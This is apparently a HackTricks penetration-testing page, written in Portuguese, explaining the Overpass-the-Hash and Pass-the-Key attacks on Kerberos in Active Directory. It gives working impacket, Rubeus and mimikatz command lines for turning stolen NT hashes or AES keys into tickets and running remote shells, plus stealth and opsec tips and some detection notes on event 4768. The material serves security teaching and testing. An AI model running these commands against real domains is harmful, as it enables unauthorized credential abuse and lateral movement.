# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

O ataque **Overpass The Hash/Pass The Key (PTK)** é projetado para ambientes onde o protocolo NTLM tradicional é restringido, e a autenticação Kerberos tem precedência. Este ataque aproveita o hash NTLM ou as chaves AES de um usuário para solicitar tickets Kerberos, permitindo acesso não autorizado a recursos dentro de uma rede.

Estritamente falando:

- **Over-Pass-the-Hash** geralmente significa transformar o **NT hash** em um Kerberos TGT via a chave Kerberos **RC4-HMAC**.
- **Pass-the-Key** é a versão mais genérica em que você já possui uma chave Kerberos como **AES128/AES256** e solicita um TGT diretamente com ela.

Essa diferença importa em ambientes hardening: se **RC4 estiver desativado** ou não for mais assumido pelo KDC, o **NT hash sozinho não é suficiente** e você precisa de uma **chave AES** (ou da senha em texto claro para derivá-la).

Para executar este ataque, a etapa inicial envolve adquirir o hash NTLM ou a senha da conta do usuário alvo. Após obter essas informações, um Ticket Granting Ticket (TGT) para a conta pode ser obtido, permitindo que o atacante acesse serviços ou máquinas para as quais o usuário tem permissões.

O processo pode ser iniciado com os seguintes comandos:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Para cenários que exigem AES256, a opção `-aesKey [AES key]` pode ser utilizada:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` também suporta solicitar um **service ticket diretamente por meio de um AS-REQ** com `-service <SPN>`, o que pode ser útil quando você quer um ticket para um SPN específico sem um TGS-REQ extra:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Além disso, o ticket adquirido pode ser empregado com várias ferramentas, incluindo `smbexec.py` ou `wmiexec.py`, ampliando o escopo do ataque.

Problemas encontrados, como _PyAsn1Error_ ou _KDC cannot find the name_, geralmente são resolvidos atualizando a biblioteca Impacket ou usando o hostname em vez do endereço IP, garantindo compatibilidade com o Kerberos KDC.

Uma sequência alternativa de comandos usando Rubeus.exe demonstra outro aspecto desta técnica:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Este método espelha a abordagem **Pass the Key**, com foco em assumir o controle e utilizar o ticket diretamente para fins de autenticação. Na prática:

- `Rubeus asktgt` envia o **AS-REQ/AS-REP Kerberos bruto** por si só e **não** precisa de privilégios de admin, a menos que você queira mirar outra sessão de logon com `/luid` ou criar uma separada com `/createnetonly`.
- `mimikatz sekurlsa::pth` injeta material de credenciais em uma sessão de logon e, portanto, **toca o LSASS**, o que geralmente requer admin local ou `SYSTEM` e é mais ruidoso do ponto de vista de EDR.

Exemplos com Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Para se adequar à operational security e usar AES256, o seguinte comando pode ser aplicado:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` é relevante porque o tráfego gerado pelo Rubeus difere levemente do Kerberos nativo do Windows. Observe também que `/opsec` foi criado para tráfego **AES256**; usá-lo com RC4 geralmente exige `/force`, o que destrói boa parte do propósito porque **RC4 em domains modernos, por si só, já é um forte sinal**.

## Detection notes

Cada solicitação de TGT gera **evento `4768`** no DC. Nas versões atuais do Windows, esse evento contém campos mais úteis do que as descrições antigas mencionam:

- `TicketEncryptionType` informa qual enctype foi usado para o TGT emitido. Valores típicos são `0x17` para **RC4-HMAC**, `0x11` para **AES128** e `0x12` para **AES256**.
- Eventos atualizados também expõem `SessionKeyEncryptionType`, `PreAuthEncryptionType` e os enctypes anunciados pelo cliente, o que ajuda a distinguir **dependência real de RC4** de defaults legados confusos.
- Ver `0x17` em um ambiente moderno é uma boa pista de que a conta, o host ou o fallback path do KDC ainda permite RC4 e, portanto, é mais amigável ao Over-Pass-the-Hash baseado em NT-hash.

A Microsoft vem reduzindo gradualmente o comportamento de RC4 por default desde as atualizações de hardening do Kerberos de novembro de 2022, e a orientação publicada atual é **remover RC4 como enctype assumido por default para AD DCs até o fim do Q2 de 2026**. Do ponto de vista ofensivo, isso significa que **Pass-the-Key com AES** está se tornando cada vez mais o caminho confiável, enquanto o clássico **NT-hash-only OpTH** vai falhar com mais frequência em ambientes hardened.

Para mais detalhes sobre Kerberos encryption types e o comportamento relacionado a tickets, consulte:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Cada logon session só pode ter um TGT ativo por vez, então tenha cuidado.

1. Crie uma nova logon session com **`make_token`** do Cobalt Strike.
2. Depois, use Rubeus para gerar um TGT para a nova logon session sem afetar a existente.

Você pode obter um isolamento semelhante diretamente pelo Rubeus com uma sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Isso evita sobrescrever o atual session TGT e geralmente é mais seguro do que importar o ticket para sua sessão de logon existente.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
